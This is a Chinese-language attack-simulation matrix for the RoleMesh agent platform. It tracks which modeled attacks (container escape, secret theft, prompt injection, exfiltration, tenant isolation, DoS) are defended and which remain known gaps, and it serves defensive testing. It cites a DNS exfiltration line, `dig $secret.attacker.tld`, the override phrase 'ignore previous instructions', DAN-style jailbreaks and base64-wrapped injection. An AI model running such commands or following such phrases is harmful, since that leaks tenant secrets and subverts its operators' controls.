# 攻击模拟矩阵

追踪针对 RoleMesh 三层防御（容器加固、内容安全管道、网络出向）以及租户隔离面的所有建模攻击，并记录每项防御的当前状态。

本文档是与测试套件对齐的**快照**。权威状态保存在 `tests/attack_sim/` 和 `scripts/verify-hardening.sh` 中；如果此处的状态与测试结果不一致，以测试为准。本矩阵的用途在于指引方向——"我们建模了哪些攻击、本缺口属于哪一类、该防御设计要读哪份文档"。

**真实来源**：`tests/attack_sim/`（自动化）和 `scripts/verify-hardening.sh`（手动，实际运行的容器）。

关于各防御层的设计依据，请参见：

- [`13-safety-overview.md`](13-safety-overview.md) —— 三层模型
- [`14-container-hardening-architecture.md`](14-container-hardening-architecture.md) —— A 和 G 类
- [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md) —— B4、C、D 类（内容检查）
- [`16-egress-control-architecture.md`](16-egress-control-architecture.md) —— D4 以及 B 的部分（网络外泄）
- [`6-auth-architecture.md`](6-auth-architecture.md)、[`4-multi-tenant-architecture.md`](4-multi-tenant-architecture.md) —— E 类

---

## 状态图例

- ✅ **defended** —— 自动化测试断言防御成立
- ❌ **undefended (known)** —— xfail 测试记录该缺口，当指定的防御上线后即可关闭
- 🔧 **manual only** —— 由 runbook 验证，未自动化
- 📝 **documented limitation** —— 已评估，在 v1 中选择不防御；详见关联说明

---

## A. 容器逃逸 / 沙箱突破

由 [`14-container-hardening-architecture.md`](14-container-hardening-architecture.md) 支撑。

| ID | 攻击 | 防御 | 测试 | 状态 |
|---|---|---|---|---|
| A1 | Fork 炸弹 | PidsLimit 512 | `test_A_container_escape_spec::test_A1_fork_bomb_capped_by_pids_limit` | ✅ spec + 🔧 manual |
| A2 | 对另一进程执行 ptrace | seccomp 默认 + CapDrop ALL + no-new-privileges | `test_A2_ptrace_requires_cap_blocked_by_cap_drop` | ✅ spec + 🔧 manual |
| A3 | 挂载 /proc/kcore | CapDrop ALL（无 CAP_SYS_ADMIN）+ AppArmor | `test_A3_kcore_mount_requires_sys_admin_which_is_dropped` | ✅ spec + 🔧 manual |
| A4 | 写入 /etc/shadow，持久化 rootfs | ReadonlyRootfs + tmpfs 切出 | `test_A4_rootfs_is_readonly` | ✅ spec + 🔧 manual |
| A5 | 云元数据凭据窃取 | ExtraHosts 黑洞化（`169.254.169.254`、`metadata.google.internal` → `127.0.0.1`） | `test_A5_metadata_endpoints_blackholed` | ✅ spec + 🔧 manual |
| A6 | docker.sock 挂载注入 | `_is_docker_socket_path` basename 守卫 | `test_A6_docker_sock_mount_injection_detected`、`test_A6_spec_to_config_rejects_docker_sock_mount` | ✅ |
| A7 | 特权容器请求 | `HostConfig` 永不发出 `Privileged` | `test_A7_privileged_never_true` | ✅ |
| A8 | 基于 swap 的内存放大 | `MemorySwap == Memory`；`Swappiness 0` | `test_A8_swap_disabled_equal_to_memory` | ✅ spec + 🔧 manual |

---

## B. 凭据 / 密钥窃取

由 [`6-auth-architecture.md`](6-auth-architecture.md)（TokenVault）、[`7-external-mcp-architecture.md`](7-external-mcp-architecture.md)（凭据代理）、[`15-safety-framework-architecture.md`](15-safety-framework-architecture.md)（密钥扫描器）支撑。

| ID | 攻击 | 防御 | 测试 | 状态 |
|---|---|---|---|---|
| B1 | 恶意后端通过 `extra_env` 夹带密钥 | `CONTAINER_ENV_ALLOWLIST` + `_filter_env_allowlist` | `test_B_secret_exfil::test_B1_*` | ✅ |
| B2 | 探测凭据代理以枚举 provider | 当前无限流 | `test_B2_*` | ❌ xfail（限流缺口） |
| B3 | 读取兄弟进程的 `/proc/<pid>/environ` | CapDrop + seccomp + PID namespace | `test_B3_cross_process_env_read_blocked_by_spec` + runbook | ✅ spec + 🔧 manual |
| B4 | LLM 输出 / 工具结果中的密钥模式 | `secret_scanner` 检查（detect-secrets） | `test_B4_secret_scanner_catches_patterns`（7 种模式） | ✅ (safety-ml) |
| B4' | 经混淆的密钥（跨 token 切分） | detect-secrets 基于模式 | `test_B4_secret_scanner_obfuscation_limits_documented` | 📝 documented gap |

---

## C. Prompt 注入 / 越狱

由 [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md)（ML 支撑的检查）支撑。

| ID | 攻击 | 防御 | 测试 | 状态 |
|---|---|---|---|---|
| C1 | 经典 "ignore previous instructions" | `llm_guard.prompt_injection` | `test_C_prompt_injection::test_C1_*`（3 种变体） | ✅ (safety-ml) |
| C2 | DAN / grandma / 角色覆盖越狱 | `llm_guard.jailbreak` | `test_C2_jailbreak_templates_current_behavior`（2 种变体） | 📝 当前检测器漏掉 DAN-family —— 目前仅打印 |
| C3 | 良性输入（假阳性控制） | n/a | `test_C3_benign_inputs_pass` | ✅ (safety-ml) |
| C4 | base64 包装的注入 | 仅模式检测器漏掉 | `test_C4_base64_wrapped_injection_known_gap` | 📝 documented gap |

---

## D. 数据外泄

由 [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md)（`pii.regex`、`domain_allowlist`）和 [`16-egress-control-architecture.md`](16-egress-control-architecture.md)（DNS 解析器、转发代理）支撑。

| ID | 攻击 | 防御 | 测试 | 状态 |
|---|---|---|---|---|
| D1 | LLM 输出中的 PII（SSN / CC） | `pii.regex` 检查 | `test_D_data_exfil::test_D1_*` | ✅ |
| D2 | 工具调用至攻击者 URL（dict 字段） | `domain_allowlist` 检查 | `test_D2_tool_call_to_attacker_url_blocked` | ✅ |
| D3 | URL 隐藏在 Bash 命令字符串内 | `domain_allowlist` 遍历字符串叶节点 | `test_D3_url_in_bash_command_string_detected` | ✅ |
| D4 | 通过 `dig $secret.attacker.tld` 进行 DNS 外泄 | 权威 DNS 解析器 + 每租户允许列表（EC-2） | `test_D4_dns_exfiltration_prevented` | 该行历史上为 ❌ xfail，等待 EC-2；EC-2 已落地（参见 [`16-egress-control-architecture.md`](16-egress-control-architecture.md)）—— 当前状态以测试结果为准 |
| D5 | Pastebin / transfer.sh 数据投放 | `domain_allowlist`（正向允许列表） | `test_D5_paste_services_blocked`（4 个主机） | ✅ |

---

## E. 租户隔离

由 [`4-multi-tenant-architecture.md`](4-multi-tenant-architecture.md)（双池 RLS）和 [`6-auth-architecture.md`](6-auth-architecture.md)（IPC 信任边界）支撑。

| ID | 攻击 | 防御 | 测试 | 状态 |
|---|---|---|---|---|
| E1 | 在 NATS 负载中伪造 tenantId | Engine `_tenant_matches` 守卫 | `test_E_tenant_isolation::test_E1_*` | ✅ |
| E2 | 伪造属于另一租户的 coworkerId | IPC 分发器使用源 coworker 的权威租户 | `test_E2_forged_coworker_id_dropped` | ✅ |
| E6 | NATS subject 侧信道（A 读取 B 的任务） | NATS account-per-tenant（未实现） | `test_E6_nats_subject_sidechannel_isolation` | ❌ xfail（NATS ACL 缺口） |

---

## G. 拒绝服务

由 [`14-container-hardening-architecture.md`](14-container-hardening-architecture.md)（资源上限）和 [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md)（管道成本）支撑。

| ID | 攻击 | 防御 | 测试 | 状态 |
|---|---|---|---|---|
| G1 | 容器内 fork 炸弹 | PidsLimit 512 | 仅 runbook | 🔧 manual |
| G2 | 死循环 agent | `CONTAINER_TIMEOUT` 30 分钟终止 | 仅 runbook | 🔧 manual |
| G3 | 超大 `tool_input` 负载 | 管道检查保持线性 | `test_G_dos::test_G3_*` | ✅ |
| G5 | 注册表查询风暴 | 基于 dict 的 O(1) 查找 | `test_G5_registry_lookup_is_constant_time` | ✅ |
| G6 | 审计写入压力 | 每事件单次插入 | `test_G6_audit_write_pressure` | ✅ |

---

## H. 配置攻击

由 [`6-auth-architecture.md`](6-auth-architecture.md) 和 [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md) 支撑。

| ID | 攻击 | 防御 | 测试 | 状态 |
|---|---|---|---|---|
| H1 | Agent 为另一 coworker 调度任务 | `can_manage_task` + `task_manage_others` 标志 | `test_H_config_attack::test_H1_*` | ✅ |
| H2 | 通过 REST 注入畸形策略配置 | Pydantic `config_model` + `extra='forbid'` | `test_H2_*`（6 种用例，含 `__class__` gadget） | ✅ |
| H3 | `data_scope=self` 的 agent 读取租户工作区 | `build_volume_mounts` 仅在 `data_scope=='tenant'` 时挂载项目根 | `test_H3_data_scope_self_does_not_mount_project_root` | ✅ |
| H4 | 从工作区符号链接逃逸 | PID / mount namespace + 挂载允许列表 | 仅 runbook | 🔧 manual |

---

## 计数汇总（快照，2026-04-22）

下方计数取自矩阵首次草拟之时。运行 `pytest tests/attack_sim/ -v` 获取实时情况。

| 类别 | ✅ | ❌ xfail | 📝 docs-only | 🔧 manual-only |
|---|---|---|---|---|
| A. 容器 | 12 | 0 | 0 | 6 共享 |
| B. 密钥 | 10 | 1 | 1 | 1 |
| C. Prompt 注入 | 7 | 0 | 3 | 0 |
| D. 数据外泄 | 7 | 1 | 0 | 0 |
| E. 租户隔离 | 2 | 1 | 0 | 0 |
| G. DoS | 3 | 0 | 0 | 2 |
| H. 配置 | 8 | 0 | 0 | 1 |
| **合计** | **49** | **3** | **4** | **10** |

---

## 已知未防御攻击（xfail 清单）

当相应防御层落地后，下列项会成为"进展信号"：

1. **B2 凭据代理枚举** —— 通过对凭据代理实施限流或按 agent 鉴权来关闭。
2. **D4 DNS 外泄** —— EC-2 已落地，带权威 DNS 解析器 + 每租户允许列表（参见 [`16-egress-control-architecture.md`](16-egress-control-architecture.md)）；待测试重写以覆盖网关侧路径后，可以撤销该 xfail。
3. **E6 NATS subject 侧信道** —— 通过 NATS account-per-tenant 或租户范围的 NATS 凭据来关闭。

## 已文档化的限制（已评估，在 v1 中选择不防御）

- **B4' 切分密钥** —— detect-secrets 基于模式 + 熵；LLM 作为扫描器的第二层可以捕捉这些。v1 不发布。
- **C2 DAN-family 越狱** —— llm-guard 越狱检测器漏掉这些。已在测试中文档化为仅打印；当检测器或自定义检查能捕捉时再翻为 ✅。
- **C4 base64 包装的注入** —— 模式检测器漏掉；需要基于 LLM 的扫描器。
- **F6 Stop / proposal NATS 竞争** —— 孤儿 pending 行在 `auto_expire_minutes` 内被过期回收。完美回收的成本（一张 `cancelled_jobs` 追踪表）在 v1 中不值得。
- **仅 runbook 的手动项** —— 需要实际运行的容器；规约级钉点在自动化测试中，运行时验证在 `scripts/verify-hardening.sh` 中。

---

## 运行

```bash
# Default (fast + ML-backed if [safety-ml] installed):
pytest tests/attack_sim/ -v

# Without [safety-ml] extras — C and B4 corpus skip:
pytest tests/attack_sim/ -v -k "not ml"

# Manual runbook (requires live container):
scripts/verify-hardening.sh <agent-container-name>
```
